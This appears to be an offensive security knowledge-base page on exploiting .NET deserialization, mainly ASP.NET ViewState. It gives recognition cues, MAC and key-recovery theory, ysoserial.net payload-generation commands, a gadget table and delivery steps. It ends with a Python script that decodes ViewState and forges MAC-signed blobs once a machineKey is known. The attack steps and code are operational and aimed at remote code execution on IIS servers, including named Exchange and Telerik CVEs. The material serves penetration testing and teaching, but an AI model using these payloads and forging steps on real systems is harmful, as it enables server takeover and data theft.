---
title: ".NET Deserialization - ViewState, BinaryFormatter and ysoserial.net"
category: web
subcategory: dotnet
type: technique
tags: [dotnet-deserialization, viewstate, binaryformatter, losformatter, objectstateformatter, machinekey, validationkey, viewstategenerator, typenamehandling, json-net, ysoserial-net, typeconfusedelegate, objectdataprovider, activitysurrogateselector, telerik, sharepoint, burp, viewstate-mac, aspnet]
difficulty: hard
summary: "__VIEWSTATE is a serialized object graph; with the machineKey (or MAC disabled) a ysoserial.net gadget turns it into RCE as the app-pool identity."
when_to_use:
  - "A form posts __VIEWSTATE / __VIEWSTATEGENERATOR / __EVENTVALIDATION"
  - "A base64 field starts /wEP, /wEW or AAEAAAD/////"
  - "JSON contains a $type key, or the API echoes .NET type names"
  - "web.config, a machineKey, or Telerik dialogParameters leaked via LFI"
  - "Errors mention BinaryFormatter, LosFormatter, NetDataContractSerializer or SoapFormatter"
tools: [ysoserial-net, burp, viewstate-py, python3, ilspy, dnspy]
cves: [CVE-2017-9248, CVE-2019-18935, CVE-2020-0688, CVE-2017-8565]
related: [deser-java-ysoserial, java-spring-spel-jndi, jwt-attacks-full, deser-php-object-injection]
---

## TL;DR

.NET's old formatters rebuild a typed object graph from attacker bytes and invoke setters,
`OnDeserialized` callbacks and delegates while doing it. ASP.NET Webforms ships one such
blob in every page as `__VIEWSTATE`. If the MAC key is known, disabled, or the app is one of
the hardcoded-key products, a `ysoserial.net` gadget in that field runs code as the
application pool.

## Recognise it

- `__VIEWSTATE` + `__VIEWSTATEGENERATOR` (8 hex chars) + `__EVENTVALIDATION` in a form.
- Base64 prefixes: `/wEP` = `FF 01 0F` (LOS token stream, root `Pair`), `/wEW` = `FF 01 16`
  (root `ArrayList`, typical `__EVENTVALIDATION`), `AAEAAAD/////` = raw `BinaryFormatter`
  (`00 01 00 00 00 FF FF FF FF`), `rO0AB` = Java, wrong page.
- A `__VIEWSTATE` that is *not* `/wE...` and has high entropy is encrypted (4.5 default).
- JSON carrying `"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework"`
  -> Json.NET with `TypeNameHandling != None`, or `JavaScriptSerializer` + `SimpleTypeResolver`.
- `.aspx`/`.asmx`/`.ashx`, `Server: Microsoft-IIS`, `X-AspNet-Version`.
- Errors: `Invalid viewstate`, `MAC validation failed`, `Unable to validate data`,
  `Operation is not valid due to the current state of the object`. Telerik:
  `Telerik.Web.UI.DialogHandler.aspx`, `Telerik.Web.UI.WebResource.axd`.

## Theory

**The formatters, worst first.**

| formatter | shape on the wire | notes |
|---|---|---|
| `BinaryFormatter` | `00 01 00 00 00 FF FF FF FF` / `AAEAAAD/////` | fully type-driven, the classic sink |
| `LosFormatter` / `ObjectStateFormatter` | `FF 01` + tokens | the ViewState encoder; `Token_BinarySerialized (50)` embeds a BinaryFormatter blob |
| `NetDataContractSerializer` | XML with `z:Type`/`z:Assembly` | type names come from the document = attacker |
| `SoapFormatter` | SOAP XML with `clr:` types | same problem, legacy |
| `Json.NET` | `$type` key | only dangerous when `TypeNameHandling != None` |
| `JavaScriptSerializer` | `__type` key | dangerous with `SimpleTypeResolver` |
| `DataContractSerializer` / `XmlSerializer` | XML | safe*ish*: type must be declared up front, unless a `Type` parameter is attacker-controlled |
| `XAML` / `XamlReader.Parse` | XAML | `ObjectDataProvider` executes directly |

**LOS token stream.** `ObjectStateFormatter` writes `FF 01` then a tagged tree: `Pair 15`,
`Triplet 16`, `String 5` (7-bit length-prefixed UTF-8), `IndexedString 30`, `Int32 2`,
`ArrayList 22`, `Hashtable 23`, `Null 100`, `EmptyString 101`, `True 103`, `False 104`, and
`BinarySerialized 50` - that last one wraps a BinaryFormatter graph and is the sink.

**Integrity.** ASP.NET appends `HMAC(validationKey, viewstate_bytes || modifier)`, where the
modifier is `__VIEWSTATEGENERATOR` as 4 little-endian bytes (plus `ViewStateUserKey` when
set). The algorithm comes from `machineKey validation=` (`SHA1` -> HMACSHA1/20 bytes,
`HMACSHA256`/32, `MD5`/16); `decryptionKey` separately encrypts the payload. Since 4.5
`enableViewStateMac` cannot be disabled and ViewState is encrypted unless
`ViewStateEncryptionMode="Never"` - which plenty of farm deployments set, alongside a
`<machineKey>` in `web.config` that then leaks.

**Where the key comes from.** `web.config`/`machine.config` via LFI or backups
(`web.config.bak`, `.svn`, 8.3 `~1` names); a key hardcoded in a shipped product; Exchange's
static `validationKey` (CVE-2020-0688); Telerik `dialogParameters` recovered via
CVE-2017-9248's weak-key oracle and abused through CVE-2019-18935.

## Attack

**1. Classify the blob.** Base64-decode `__VIEWSTATE`: `FF 01` = LOS token stream (walk it
for `Token_BinarySerialized`), `00 01 00 00 00 FF FF FF FF` = bare BinaryFormatter, neither
= encrypted. The script below does that and verifies a candidate MAC.

**2. Recover the key.** Pull `<machineKey validationKey=".." decryptionKey=".."
validation="SHA1" decryption="AES"/>` from `web.config`, a crash dump, or a product's
known-key list, then confirm it offline by re-computing the MAC over a captured ViewState
with its generator.

**3. Generate.** `ysoserial.net` builds both the gadget and the ViewState wrapper:

```
ysoserial.exe -p ViewState -g TypeConfuseDelegate --generator=CA0B0334 \
  --validationalg=SHA1 --validationkey=<hex> -c "cmd"
# no generator (legacy 3.5 / viewStateGeneratorless): add --islegacy --isdebug
# with encryption as well: --decryptionalg=AES --decryptionkey=<hex>
# raw gadget only, for a non-ViewState sink:
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "cmd"
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "cmd"
```

**4. Pick the gadget.**

| gadget | formatter(s) | notes |
|---|---|---|
| `TypeConfuseDelegate` | BinaryFormatter, LosFormatter | `SortedSet<string>` + delegate confusion; the ViewState default |
| `ActivitySurrogateSelector` | BinaryFormatter | compiles and runs a C# class; needs `DisableActivitySurrogateSelectorTypeCheck` on .NET 4.8+ |
| `ActivitySurrogateSelectorFromFile` | BinaryFormatter | same, loads your own `.cs`/assembly |
| `ObjectDataProvider` | Json.Net, XAML, NetDataContractSerializer, SoapFormatter, XmlSerializer | invokes any method on any type |
| `WindowsIdentity` | Json.Net, JavaScriptSerializer | the classic `$type` gadget |
| `DataSet` | BinaryFormatter, XmlSerializer | `System.Data.DataSet` XML schema abuse |
| `TextFormattingRunProperties` | BinaryFormatter | the SharePoint workhorse |
| `PSObject` | BinaryFormatter | CVE-2017-8565, PowerShell type conversion |
| `ClaimsIdentity` / `RolePrincipal` / `SessionSecurityToken` | BinaryFormatter | nested BinaryFormatter inside a claims blob |
| `ResourceSet` / `AxHostState` | BinaryFormatter, LosFormatter | compact, useful when length-limited |

**5. Deliver.** POST the signed blob as `__VIEWSTATE` with the page's own
`__VIEWSTATEGENERATOR`; if `ViewStateUserKey` is set the MAC covers it too, so work inside a
real session. **No ViewState?** The same gadgets go anywhere a formatter reads attacker
data: a `$type` field in a Json.NET body, .NET Remoting, Telerik `rauPostData`, session
state in SQL/Redis, or a cookie holding a `ClaimsIdentity`.

## Code

```python
#!/usr/bin/env python3
"""ASP.NET __VIEWSTATE triage: format detection, LOS token dump, MAC sign/verify.

Tells a BinaryFormatter blob (00 01 00 00 00 FF FF FF FF / "AAEAAAD/////") from a
LosFormatter/ObjectStateFormatter token stream (FF 01 ... / "/wEP", "/wEW"), walks
the LOS token graph, and computes the .NET 4.5 MAC = HMAC(key, viewstate || gen_le).

  python3 viewstate.py <base64> [generator-hex] [hex-validation-key] [alg]
  python3 viewstate.py                      # no args: self-test
"""
from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import struct
import sys

BF_MAGIC = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff"

# ObjectStateFormatter token constants (System.Web.UI.ObjectStateFormatter)
TOKENS = {1: "Int16", 2: "Int32", 3: "Byte", 4: "Char", 5: "String", 6: "DateTime",
          7: "Double", 8: "Single", 9: "Color", 10: "KnownColor", 11: "IntEnum",
          12: "EmptyColor", 15: "Pair", 16: "Triplet", 20: "Array", 21: "StringArray",
          22: "ArrayList", 23: "Hashtable", 24: "HybridDictionary", 25: "Type",
          27: "Unit", 28: "EmptyUnit", 29: "EventValidationStore", 30: "IndexedString",
          40: "StringFormatted", 50: "BinarySerialized", 60: "SparseArray",
          100: "Null", 101: "EmptyString", 102: "ZeroInt32", 103: "True", 104: "False"}
T_STRING, T_PAIR, T_TRIPLET, T_ARRAYLIST = 5, 15, 16, 22
T_BINARY, T_INT32, T_NULL, T_EMPTYSTR = 50, 2, 100, 101

HASHES = {"SHA1": hashlib.sha1, "SHA256": hashlib.sha256, "SHA384": hashlib.sha384,
          "SHA512": hashlib.sha512, "MD5": hashlib.md5}
MAC_LEN = {"SHA1": 20, "SHA256": 32, "SHA384": 48, "SHA512": 64, "MD5": 16}


def w7(n: int) -> bytes:
    out = bytearray()
    while n >= 0x80:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n)
    return bytes(out)


def r7(d: bytes, i: int) -> tuple[int, int]:
    n = shift = 0
    while True:
        b = d[i]
        i += 1
        n |= (b & 0x7F) << shift
        if not b & 0x80:
            return n, i
        shift += 7


def detect_formatter(data: bytes) -> str:
    """'binaryformatter' | 'losformatter' | 'unknown'."""
    if data[:9] == BF_MAGIC:
        return "binaryformatter"
    if data[:1] == b"\xff":
        return "losformatter"
    if data[:2] == b"\xac\xed":
        return "java-serialized"
    return "unknown"


HINTS = (("/wEP", "LOS Pair root (classic Webforms ViewState)"),
         ("/wEW", "LOS ArrayList root (often __EVENTVALIDATION)"),
         ("/wE", "LOS token stream"), ("AAEAAAD/////", "raw BinaryFormatter graph"),
         ("rO0AB", "java serialization, not .NET"))


def b64_hint(b64: str) -> str:
    return next(("%s -> %s" % (p, w) for p, w in HINTS if b64.startswith(p)),
                "no known prefix")


# Minimal LosFormatter reader/writer: the subset real ViewState uses
def los_read(d: bytes, i: int, depth: int, out: list[str]) -> int:
    pad = "  " * depth
    if i >= len(d):
        out.append(pad + "<eof>")
        return i
    t = d[i]
    i += 1
    name = TOKENS.get(t, "Unknown(%d)" % t)
    if t in (T_NULL, T_EMPTYSTR, 102, 103, 104, 12, 28):
        out.append(pad + name)
    elif t == T_STRING or t == 30 or t == 40:
        n, i = r7(d, i)
        out.append("%s%s %r" % (pad, name, d[i:i + n].decode("utf-8", "replace")))
        i += n
    elif t in (T_INT32, 1, 3):                       # Int32 / Int16 / Byte
        w = {T_INT32: 4, 1: 2, 3: 1}[t]
        out.append("%s%s %d" % (pad, name, int.from_bytes(d[i:i + w], "little")))
        i += w
    elif t == T_PAIR:
        out.append(pad + "Pair")
        i = los_read(d, i, depth + 1, out)
        i = los_read(d, i, depth + 1, out)
    elif t == T_TRIPLET:
        out.append(pad + "Triplet")
        for _ in range(3):
            i = los_read(d, i, depth + 1, out)
    elif t in (T_ARRAYLIST, 20, 21):
        n, i = r7(d, i)
        out.append("%s%s[%d]" % (pad, name, n))
        for _ in range(n):
            i = los_read(d, i, depth + 1, out)
    elif t == T_BINARY:
        n, i = r7(d, i)
        blob = d[i:i + n]
        i += n
        out.append("%sBinarySerialized %d bytes -> %s  *** deserialization sink ***"
                   % (pad, n, detect_formatter(blob)))
    else:
        out.append(pad + name + " (stopping: unmodelled token)")
        i = len(d)
    return i


def los_write_string(s: str) -> bytes:
    b = s.encode()
    return bytes([T_STRING]) + w7(len(b)) + b


def los_write_binary(blob: bytes) -> bytes:
    return bytes([T_BINARY]) + w7(len(blob)) + blob


def los_pair(a: bytes, b: bytes) -> bytes:
    return bytes([T_PAIR]) + a + b


def los_wrap(body: bytes) -> bytes:
    return b"\xff\x01" + body


def summarise(data: bytes) -> str:
    kind = detect_formatter(data)
    out = ["formatter: %s   (%d bytes)" % (kind, len(data)),
           "head: %s" % data[:16].hex(" ")]
    if kind == "losformatter":
        out.append("LOS version byte: %#04x" % data[1])
        lines: list[str] = []
        los_read(data, 2, 1, lines)
        out.append("token graph:")
        out += lines
    elif kind == "binaryformatter":
        out.append("SerializationHeaderRecord (rootId/headerId/major/minor)")
        markers = (b"System.Workflow", b"ObjectDataProvider", b"TypeConfuseDelegate",
                   b"SortedSet`1", b"ActivitySurrogateSelector", b"System.Data.DataSet",
                   b"TextFormattingRunProperties", b"System.Windows.Data")
        out += ["  gadget marker: %s" % m.decode() for m in markers if m in data]
    return "\n".join(out)


def generator_bytes(generator_hex: str) -> bytes:
    """__VIEWSTATEGENERATOR 'CA0B0334' -> 4-byte little-endian modifier."""
    return struct.pack("<I", int(generator_hex, 16))


def viewstate_mac(key: bytes, viewstate: bytes, generator_hex: str,
                  alg: str = "SHA1") -> bytes:
    return hmac.new(key, viewstate + generator_bytes(generator_hex),
                    HASHES[alg.upper()]).digest()


def sign_viewstate(key: bytes, viewstate: bytes, generator_hex: str,
                   alg: str = "SHA1") -> str:
    mac = viewstate_mac(key, viewstate, generator_hex, alg)
    return base64.b64encode(viewstate + mac).decode()


def verify_viewstate(key: bytes, b64: str, generator_hex: str,
                     alg: str = "SHA1") -> tuple[bool, bytes]:
    raw = base64.b64decode(b64 + "=" * (-len(b64) % 4))
    n = MAC_LEN[alg.upper()]
    body, mac = raw[:-n], raw[-n:]
    return hmac.compare_digest(mac, viewstate_mac(key, body, generator_hex, alg)), body


def crack_algorithm(key: bytes, b64: str, generator_hex: str) -> str | None:
    """Given a known key, find which HMAC the app is using."""
    for alg in HASHES:
        ok, _ = verify_viewstate(key, b64, generator_hex, alg)
        if ok:
            return alg
    return None


def _self_test() -> None:
    # a realistic LOS ViewState: Pair(Pair(Null, String), BinarySerialized)
    inner = los_pair(bytes([T_NULL]), los_write_string("ctf"))
    bf = BF_MAGIC + b"\x01\x00\x00\x00" + b"TypeConfuseDelegate"
    los = los_wrap(los_pair(inner, los_write_binary(bf)))
    assert detect_formatter(los) == "losformatter"
    assert detect_formatter(bf) == "binaryformatter"
    assert detect_formatter(b"\xac\xed\x00\x05") == "java-serialized"
    assert base64.b64encode(los).decode().startswith("/wEP"), base64.b64encode(los)[:8]
    assert b64_hint(base64.b64encode(los).decode()).startswith("/wEP")
    assert b64_hint(base64.b64encode(bf).decode()).startswith("AAEAAAD/////")

    txt = summarise(los)
    assert "Pair" in txt and "BinarySerialized" in txt and "deserialization sink" in txt, txt
    assert "'ctf'" in txt, txt
    assert "TypeConfuseDelegate" in summarise(bf), summarise(bf)

    al = los_wrap(bytes([T_ARRAYLIST]) + w7(1) + los_write_string("x"))
    assert base64.b64encode(al).decode().startswith("/wEW")   # __EVENTVALIDATION shape

    # MAC sign / verify / tamper, across algorithms
    key = bytes.fromhex("01" * 20)
    gen = "CA0B0334"
    assert generator_bytes(gen) == b"\x34\x03\x0b\xca"
    for alg in ("SHA1", "SHA256", "MD5"):
        signed = sign_viewstate(key, los, gen, alg)
        ok, body = verify_viewstate(key, signed, gen, alg)
        assert ok and body == los, alg
        assert crack_algorithm(key, signed, gen) is not None
        bad = bytearray(base64.b64decode(signed))
        bad[5] ^= 0xFF                       # flip a payload byte -> MAC must fail
        ok2, _ = verify_viewstate(key, base64.b64encode(bytes(bad)).decode(), gen, alg)
        assert not ok2, "tampered viewstate verified under " + alg
        assert not verify_viewstate(key, signed, "DEADBEEF", alg)[0]   # gen is in the MAC
        assert not verify_viewstate(b"\x02" * 20, signed, gen, alg)[0]  # wrong key
    print("[ok] viewstate self-test passed")


def main(argv: list[str]) -> int:
    b64 = argv[1]
    raw = base64.b64decode(b64 + "=" * (-len(b64) % 4))
    print("b64 prefix: " + b64_hint(b64))
    if len(argv) >= 4:                       # b64 generator validationkey [alg]
        found = crack_algorithm(bytes.fromhex(argv[3]), b64, argv[2])
        print("MAC alg: %s" % (found or "no match - wrong key, or encrypted"))
        if found:
            raw = raw[:-MAC_LEN[found]]
    print(summarise(raw))
    return 0


if __name__ == "__main__":
    if len(sys.argv) == 1:
        _self_test()
    else:
        raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Encrypted ViewState looks like noise**: no `/wE` prefix means you also need `decryptionKey` - a validation key alone is not enough on 4.5 defaults.
- **The generator is inside the MAC**, so a blob from another page or app fails even with the
  right key - always pair it with its own `__VIEWSTATEGENERATOR`.
- **`ViewStateUserKey`** mixes a session value into the MAC: without it the MAC fails no
  matter how right the key is. Conversely `enableViewStateMac="false"` survives on legacy
  4.0 app pools, where no key is needed at all - just a valid LOS blob.
- **Length**: `ActivitySurrogateSelector` payloads are large and IIS may reject them outright;
  `ResourceSet`/`AxHostState` are compact fallbacks. .NET 4.8+ also blocks that gadget unless
  the type check is disabled first (ysoserial.net emits a two-stage payload).
- **`BinaryFormatter` is removed in .NET 9**: modern ASP.NET Core targets are Json.NET
  `$type` or XAML bugs instead.
- **MAC oracle**: different errors for "bad MAC" vs "bad payload" tell you when a key guess
  from a shipped-key list is right.

## Tools

- `ysoserial.net` - `-p ViewState`; `-f <Formatter> -g <Gadget> -o base64 -c "cmd"`; plugins for Altserialization, DotNetNuke, Resx, SharePoint.
- `viewstate` (python, `--decode`) and the script above for offline triage. Burp `.NET Beautifier`, `Freddy`, `ViewState Editor`; `dnSpy`/`ILSpy` to read the target
  assemblies and confirm which formatter is actually in use.

## References

- pwntester/ysoserial.net - GitHub (gadget and plugin list).
- Alvaro Munoz & Oleksandr Mirosh - "Friday the 13th: JSON Attacks" (BlackHat USA 2017).
- Soroush Dalili - "Exploiting Deserialisation in ASP.NET via ViewState".
- Microsoft docs - `machineKey` element and `BinaryFormatter` deprecation.
